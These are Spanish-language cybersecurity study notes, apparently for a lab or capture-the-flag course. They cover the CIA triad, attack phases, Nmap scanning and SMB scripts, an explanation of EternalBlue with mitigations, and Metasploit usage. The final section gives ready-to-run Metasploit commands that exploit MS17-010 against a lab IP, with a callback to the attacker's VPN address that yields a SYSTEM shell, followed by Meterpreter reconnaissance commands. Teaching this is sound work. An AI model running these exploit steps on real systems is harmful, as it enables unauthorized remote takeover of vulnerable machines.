# Teoría de Básicos de Ciberseguridad
## Triada CIA
La triada CIA es uno de los modelos fundamentales de la ciberseguridad. Su nombre proviene de tres principios: Confidencialidad (Confidentiality), Integridad (Integrity) y Disponibilidad (Availability). Estos conceptos se utilizan para evaluar qué debe proteger un sistema y qué consecuencias tendría un fallo de seguridad. 

La **_confidencialidad_** consiste en garantizar que la información únicamente pueda ser consultada por usuarios, sistemas o procesos autorizados. Para conseguirlo se emplean mecanismos como el control de acceso, la autenticación, los permisos y el cifrado. Por ejemplo, una filtración de una base de datos supone un fallo de confidencialidad, aunque los datos no hayan sido modificados. 

La **_integridad_** garantiza que la información sea correcta y que no pueda ser modificada o eliminada de forma no autorizada. También implica poder detectar alteraciones accidentales o maliciosas. Herramientas como los hashes, las firmas digitales, los controles de acceso o los sistemas de control de versiones ayudan a preservar la integridad. Un atacante que modifica el saldo de una cuenta bancaria sin autorización compromete este principio. 

Por último, la **_disponibilidad (Availability)_** asegura que la información y los servicios estén accesibles cuando los usuarios autorizados los necesiten. Para ello se utilizan medidas como redundancia, copias de seguridad, balanceo de carga y protección frente a ataques de denegación de servicio. Un servidor que deja de funcionar debido a un ataque o a un fallo de hardware representa un problema de disponibilidad.

## Equipos Blue/Red
Dentro de la ciberseguridad, el Blue Team y el Red Team representan dos enfoques diferentes pero complementarios. Mientras el Red Team intenta identificar y explotar debilidades desde la perspectiva de un atacante, el Blue Team se encarga de proteger la infraestructura, detectar amenazas y responder ante incidentes. 

El **_Blue Team_** suele ofrecer oportunidades de entrada más accesibles. En los puestos iniciales es habitual comenzar como analista SOC (security operations center), monitorizando alertas generadas por herramientas como SIEM (security information & event management), EDR (endpoint detection & response) o IDS (intrusion detection system). Desde ahí, se puede especializar en investigación de incidentes, threat hunting, análisis de malware o respuesta ante ataques. En los niveles más altos se encuentran puestos como Incident Response Manager, Security Engineer, Security Architect o CISO, responsable de dirigir la estrategia global de seguridad de una organización. 

El **_Red Team,_** por otro lado, está más orientado a la seguridad ofensiva. Un punto de entrada habitual puede ser un puesto de Junior Pentester, realizando pruebas de seguridad sobre aplicaciones, redes o sistemas bajo autorización. Con experiencia, se puede evolucionar hacia puestos de Pentester, especialista en seguridad de aplicaciones o adversary simulation. En los niveles más avanzados se encuentran los Red Team Operators y Red Team Leads, capaces de simular campañas completas similares a las realizadas por atacantes reales, combinando técnicas de acceso inicial, escalada de privilegios, movimiento lateral y evasión de defensas.

## Fases de un Ciberataque
### 1.Reconocimiento
Un ciberataque empieza siempre recabando toda la información posible sobre nuestro objetivo. Esto nos va a servir para encontrar posibles puntos de entrada y posibles vulnerabilidades que explotar. Esta información puede venir como la topografía de una red y los puertos abiertos de los equipos que estén en esta, las versiones de servicios que corren en estos puertos, las direcciones a las que tenemos acceso en una página web e incluso información identificante de personas reales que se encuentren en páginas públicas.
### 2.Explotación
Una vez tengamos toda la información necesaria, podemos pasar a intentar explotar las vulnerabilidades que hayamos encontrado para poder meternos en la máquina. Esto significa que tenemos que conseguir ejecutar código que hayamos escrito nosotros en la máquina objetivo. Este código, comúnmente conocido como un _payload_, se puede inyectar de muchas formas, pero casi todas tienen el objetivo de permitir avanzar hacia las siguientes fases de un ataque.

### 3.Permanencia
Aunque las máquinas que vamos a hacer suelen estar diseñadas para hacerlas de una sentada, no siempre tendremos esa comodidad en el mundo real, y a veces necesitamos tener acceso al sistema al que hemos entrado durante varios días seguidos, aguantando reinicios del sistema infectado y cambios en la topología de la red. La permanencia nos asegura un punto de guardado al que volver siempre para reanudar el trabajo.

### 4.Escalada
Muchas veces cuando entramos a una máquina, nos damos cuenta de que no tenemos acceso a todo lo que nos gustaría, y es entonces cuando nos damos cuenta que es debido a que no tenemos todos los permisos que nos gustaría. Entonces tenemos que seguir buscando vulnerabilidades para intentar escalar privilegios, o lo que es lo mismo, conseguir más y más privilegios. El nivel máximo de privilegios en cualquier sistema, el que puede hacer todo lo que quiera, se conoce como administrador: root en Linux, NT AUTHORITY\SYSTEM en Windows.
# Nmap
## Escaneo de puertos
### Selección de técnicas de escaneo de puertos 

- -sS (TCP SYN / Stealth Scan): Envía un paquete SYN. No completa el Handshake de 3 vías (envía RST si recibe SYN-ACK). Es el escaneo predeterminado por defecto. 
    
- -sT (TCP Connect): Completa la conexión TCP realizando el Handshake de 3 vías (SYN, SYN-ACK, ACK). Se usa por defecto si el usuario no tiene privilegios de superusuario (root/Administrator). 
    
- -sU (UDP Scan): Escanea puertos UDP enviando paquetes específicos del protocolo. Es más lento que los escaneos TCP. 
    
- -sA (TCP ACK Scan): Envía paquetes ACK. Se utiliza para mapear reglas de firewall y determinar si los puertos están filtrados o no filtrados. 
    
- -sW (TCP Window Scan): Similar al escaneo ACK, pero examina el tamaño de la ventana TCP para intentar diferenciar entre puertos abiertos y cerrados en ciertos sistemas. 
    
- -sM (TCP Maimon Scan): Envía paquetes FIN/ACK. Utilizado en algunos sistemas derivados de BSD para determinar el estado de los puertos. 
    
- -sN / -sF / -sX (NULL, FIN y Xmas Scan): Escaneos con combinaciones de flags TCP inusuales (sin flags, solo FIN, o FIN/PSH/URG) diseñados para evadir ciertos firewalls que no hacen seguimiento de estado (stateless). 
    
- -sY / -sZ (SCTP INIT / Cookie-Echo Scan): Escaneos específicos para el protocolo SCTP. 
    
- -sO (IP Protocol Scan): Determina qué protocolos de nivel de red (ICMP, TCP, UDP, GRE, etc.) son soportados por el objetivo. 
    
### Selección del rango o lista de puertos 

- -p <\puertos>: Especifica los puertos a escanear. Ejemplos: 
    
- -p 80,443: Escanea únicamente los puertos 80 y 443. 
    
- -p 1-1024: Escanea del puerto 1 al 1024. 
    
- -p-: Escanea los 65,535 puertos TCP existentes (1-65535). 
    
- -p U:53,111,T:21-25: Especifica puertos UDP (U:) y TCP (T:) de forma independiente. 
    
- -F (Fast Scan): Escanea los 100 puertos más comunes en lugar de los 1,000 habituales. 
    
- -r (Consecutive Scan): Escanea los puertos de forma secuencial en lugar de ordenarlos de manera aleatoria. 
    
- --top-ports /<número\>: Escanea los $N$ puertos más frecuentes según la base de datos interna de Nmap (ejemplo: --top-ports 500). 
    
- --port-ratio <\ratio>: Escanea los puertos que tengan una frecuencia de uso mayor que el ratio indicado (entre 0 y 1). 


### Ajuste de rendimiento y tiempos en el escaneo de puertos 

- --min-rate <\número> / --max-rate <número>: Establece el límite mínimo o máximo de paquetes por segundo enviados durante el reconocimiento de puertos. 
    

- --scan-delay <\tiempo>: Fuerza un retraso mínimo entre cada sonda enviada a un puerto para no saturar la red o evadir limites de tasa (rate-limiting). 
    

### Exportación a ficheros 

- -oN <\fichero> (Output Normal): Guarda los resultados en texto plano tal y como se muestran en la pantalla durante la ejecución del comando. 
    

- -oX <\fichero> (Output XML): Exporta los resultados en formato XML. Es el formato recomendado para importar los datos posteriormente en otras herramientas (como Metasploit, Faraday, Zenmap o scripts de parseo automatizado). 
    

- -oG <\fichero> (Output Grepable): Formato estructurado en una sola línea por cada host. Facilita la extracción rápida de puertos e IPs usando herramientas de línea de comandos como grep, awk, cut o sed. 
    

- -oA <\basename> (Output All): Genera simultáneamente los tres formatos principales de salida (.nmap para Normal, .xml para XML y .gnmap para Grepable) utilizando el nombre base especificado.

## Nmap Scripting Engine: 

### Concepto y categorías del Nmap Scripting Engine (NSE) 

El NSE (Nmap Scripting Engine) es una extensión de Nmap basada en el lenguaje Lua que permite automatizar tareas avanzadas sobre los servicios detectados. Se activa principalmente mediante la opción -sC (que ejecuta el conjunto de scripts por defecto) o usando el flag --script. 

Los scripts están organizados por categorías según su finalidad: 

- default: Scripts seguros y rápidos ejecutados por defecto con -sC o -A. 
    
- discovery: Enfocados en obtener más información de la red y los servicios (enumeración de recursos, usuarios, compartidos, etc.). 
    
- safe: Scripts no invasivos diseñados para no hacer caer el servicio ni consumir recursos excesivos. 
    
- intrusive: Scripts que pueden saturar servicios o generar alertas en la red objetivo. 
    
- vuln: Detectan si el servicio expuesto cuenta con vulnerabilidades conocidas (CVEs). 
    
- exploit: Intentan aprovechar activamente una vulnerabilidad (uso restringido y controlado). 
    
- auth: Evalúan o evaden mecanismos de autenticación. 
    
- brute: Realizan ataques de fuerza bruta contra credenciales de acceso. 
    
### Opciones de línea de comandos para invocar scripts en Nmap 

- -sC: Equivale a --script=default. Ejecuta la selección estándar de scripts seguros de reconocimiento. 
    
- --script <nombre|categoría>: Ejecuta un script específico, una lista separada por comas, un comodín o una categoría entera. 
    
- Ejemplo por categoría: --script "discovery and safe" 
    
- Ejemplo por patrón: --script "smb-*" 
    
- --script-args <clave=valor>: Permite pasar argumentos o parámetros personalizados a los scripts en ejecución (como usuario, contraseña, dominios o rutas de archivos). 
    
- --script-args-file <\fichero>: Carga los argumentos del script desde un archivo externo. 
    
- --script-trace: Muestra todo el tráfico de red enviado y recibido por los scripts a nivel de aplicación (útil para depuración y análisis). 
    
- --script-updatedb: Actualiza la base de datos interna de scripts de Nmap (script.db). 
    
### Scripts de NSE enfocados en la enumeración y reconocimiento de SMB (TCP 445/139) 

Los scripts específicos para el servicio SMB comienzan con el prefijo smb- o smb2-. Entre los más destacados para la fase de reconocimiento se encuentran: 

#### Enumeración de información del sistema y dialectos 

- smb-os-discovery: Obtiene información detallada del sistema operativo objetivo, nombre del equipo, dominio, grupo de trabajo y la hora del sistema a través de SMB. 
    
- smb2-capabilities / smb2-time: Identifica las capacidades del protocolo SMBv2/v3 y la hora precisa del host objetivo. 
    
- smb-protocols: Determina las versiones y dialectos del protocolo SMB soportados por el servidor (SMBv1, SMBv2, SMBv3), crucial para identificar compatibilidad heredada. 
    
#### Enumeración de recursos compartidos y permisos 

- smb-enum-shares: Lista todos los recursos compartidos en la red (directorios, impresoras, recursos ocultos como C$, ADMIN$, IPC$) y verifica los permisos de acceso para el usuario actual o la sesión nula. 
    
- smb-ls: Inspecciona el contenido de los recursos compartidos accesibles, mostrando archivos y carpetas contenidos en ellos. 
    
#### Enumeración de usuarios, grupos y sesiones 

- smb-enum-users: Enumera los usuarios locales y de dominio del sistema objetivo mediante llamadas RPC o SID lookup. 
    
- smb-enum-groups: Lista los grupos de usuarios definidos en el sistema o en el dominio. 
    
- smb-enum-sessions: Muestra las sesiones activas de usuarios conectados remotamente al servicio SMB. 
    
#### Verificación de políticas de seguridad 

- smb-security-mode / smb2-security-mode: Comprueba la configuración de seguridad del servicio, indicando si se exige la firma de mensajes SMB (SMB Signing) habilitada o requerida. 
    

- smb-double-pulsar-backdoor: Verifica si la máquina objetivo está infectada con la implantación DoublePulsar. 
    

#### Mapeo de vulnerabilidades conocidas en SMB (Categoría vuln) 

- smb-vuln-ms17-010: Comprueba si el objetivo es vulnerable a EternalBlue (MS17-010) sin ejecutar la explotación. 
    

- smb-vuln-ms08-067: Analiza la presencia de la vulnerabilidad crítica en el servicio Server de Windows (MS08-067). 
    

### Opciones para exportar los resultados a ficheros 

(Conservando la estructura del módulo para la documentación de resultados de scripts) 

- -oN <\fichero> (Output Normal): Guarda en texto plano la salida completa de los scripts tal y como aparece en la consola. 
    

- -oX <\fichero> (Output XML): Estructura en XML los datos obtenidos por los scripts (ideal para importar a plataformas de gestión de vulnerabilidades o procesamiento con scripts). 
    

- -oG <\fichero> (Output Grepable): Incluye en una sola línea por host los hallazgos principales recopilados durante la ejecución. 
    

- -oA <\basename> (Output All): Genera los archivos en los tres formatos principales (.nmap, .xml y .gnmap) usando el prefijo seleccionado.

# EternalBlue
## ¿Qué es EternalBlue? 

EternalBlue (identificado oficialmente por Microsoft como MS17-010) es una vulnerabilidad crítica de seguridad y una herramienta de explotación (exploit) que afecta al protocolo de red SMBv1 (Server Message Block versión 1) en sistemas operativos Microsoft Windows. 

- Origen: Fue desarrollada originalmente por la NSA (Agencia de Seguridad Nacional de EE. UU.). 
    
- Filtración: En abril de 2017, el grupo de hackers conocidos como The Shadow Brokers filtró públicamente esta herramienta junto con otros exploits del gobierno. 
    
- Impacto global: Tras su filtración, fue el motor principal que impulsó ataques cibernéticos a escala masiva como los ciberataques globales de ransomware WannaCry y NotPetya en 2017. 
    
## ¿Cómo funciona a alto nivel? (Mecanismo del ataque) 

Para entender cómo funciona sin entrar en la complejidad matemática de la memoria del sistema, podemos dividir el ataque en cuatro pasos sencillos: 


1. Escucha en la red: El servicio SMB escucha por defecto en el puerto TCP 445. Este servicio permite a los equipos Windows compartir archivos e impresoras en una red local. 
    
2. Desbordamiento de búfer: El atacante envía paquetes de red especialmente manipulados al puerto 445. Debido a un fallo de programación en la manera en que el controlador de Windows (srv.sys) gestiona estas peticiones de SMBv1, el sistema no calcula correctamente el tamaño del mensaje recibido. 
    
3. Corrupción de memoria: La información "rebosa" el espacio de memoria asignado (Buffer Overflow), permitiendo al atacante sobrescribir zonas de la memoria RAM del sistema operativo. 
    
4. Ejecución remota de código (RCE): Al controlar esa zona de la memoria, el atacante puede inyectar y ejecutar sus propias instrucciones sin necesidad de contar con usuario o contraseña válida. 
    
## ¿Por qué es una vulnerabilidad tan peligrosa? 

- RCE No Autenticado: No requiere que el atacante tenga credenciales (usuario/contraseña) en el equipo víctima ni que la víctima haga clic en ningún enlace o abra ningún archivo. 
	
- Máximos privilegios: El servicio SMB funciona en el nivel más profundo del sistema operativo. Al explotarlo, el atacante obtiene permisos de NT AUTHORITY\SYSTEM (acceso total e irrestricto al equipo). 
    
- Capacidad de Gusano (Wormable): Al no requerir interacción humana, un malware que utilice EternalBlue puede escanear la red local, infectar una máquina, y desde esa máquina infectar automáticamente a todas las demás máquinas vulnerables conectadas a la red en cuestión de minutos. 
    
## Sistemas Afectados 

Afectó a casi todas las versiones de Windows que tenían habilitado el protocolo SMBv1 por defecto en el momento de su filtración: 

- Windows XP, Windows Vista, Windows 7, Windows 8 y 8.1. 
    
- Windows Server 2003, 2008, 2012 y 2016. 
    
## Medidas de Mitigación y Prevención (Perspectiva Defensiva) 

1. Instalación de parches de seguridad: Aplicar el boletín de seguridad MS17-010 publicado por Microsoft en marzo de 2017 (incluso antes de la filtración de Shadow Brokers). 
    
2. Deshabilitar SMBv1: Desactivar completamente la versión 1 del protocolo SMB en todo el parque informático, forzando el uso de versiones seguras (SMBv2 o SMBv3). 
    
3. Segmentación y cortafuegos: Bloquear el tráfico entrante y saliente del puerto TCP 445 desde Internet hacia las redes internas y restringir la comunicación SMB entre segmentos de red que no lo requieran.
# Metasploit
## smb_version)

Identifica el sistema operativo, nombre del equipo y versión exacta del servicio (Windows SMB o Samba). 

- Módulo: auxiliary/scanner/smb/smb_version 
- Uso: 
    
`use auxiliary/scanner/smb/smb_version`

`set RHOSTS 10.10.10.40`

`run`

- Utilidad: Permite mapear versiones específicas con vulnerabilidades conocidas (ej. Samba 3.0.20 o SambaCry). 
    
## pipe_auditor

Comprueba qué canales IPC (Pipes) están abiertos a través del recurso compartido IPC$ usando sesiones nulas o autenticadas. 

- Módulo: auxiliary/scanner/smb/pipe_auditor 
- Uso: 
    
`use auxiliary/scanner/smb/pipe_auditor`

`set RHOSTS 10.10.10.40`

`run`

- Utilidad: Confirma la presencia de Pipes accesibles (como \netlogon, \lsarpc o \samr), prerrequisito necesario para enviar payloads de exploits como MS17-010 (EternalBlue). 
    
## ms17_010_eternalblue

Realiza el exploit de eternalblue en una máquina vulnerable y nos abre una powershell dentro.
- Módulo: windows/smb/ms17_010_eternalblue
- Uso:
	
`use windows/smb/ms17_010_eternalblue`

`set RHOSTS 10.10.10.40`

`set LHOSTS 10.120.134.15 #RECORDAD QUE ESTA IP ES TU INTERFAZ DEL VPN (aparece como tun0 en $ip a)`

`run`

- Utilidad: Abre una terminal de powershell como usuario NT-AUTHORITY/SYSTEM (administrador) en un ordenador con la vulnerabilidad EternalBlue.
	
## Comandos Meterpreter  

Una vez establecida la sesión de Meterpreter, estos son los comandos más comunes organizados por categorías para recopilar información del sistema objetivo: 

### Información del sistema y entorno 

- sysinfo: Muestra el nombre del equipo, versión del SO, arquitectura (x86/x64), idioma y dominio. 
    
- getuid: Muestra el usuario actual con el que se está ejecutando el proceso (ej. NT AUTHORITY\SYSTEM o usuario local). 
    
- getprivs: Enumera los privilegios del token actual del usuario en la máquina (útil para verificar si se tiene privilegios de administración como SeDebugPrivilege). 
    
- getenv: Muestra el valor de variables de entorno del sistema (ej. getenv PATH o getenv TEMP). 
    
### Reconocimiento de red 

- ipconfig / ifconfig: Lista las interfaces de red, direcciones IP, máscaras de subred y MACs asignadas. 
    
- netstat: Muestra las conexiones de red activas, puertos en escucha e IPs asociadas. 
    
- route: Muestra la tabla de enrutamiento del sistema objetivo (clave para identificar otras subredes y realizar pivoting). 
    
### Procesos y archivos 

- ps: Lista todos los procesos en ejecución, sus IDs (PID), nombres y arquitectura. 
    
- getpid: Muestra el ID del proceso (PID) en el que está inyectado actualmente Meterpreter. 
    
- ls / pwd: Permite listar archivos y ver el directorio de trabajo actual dentro del sistema de archivos.
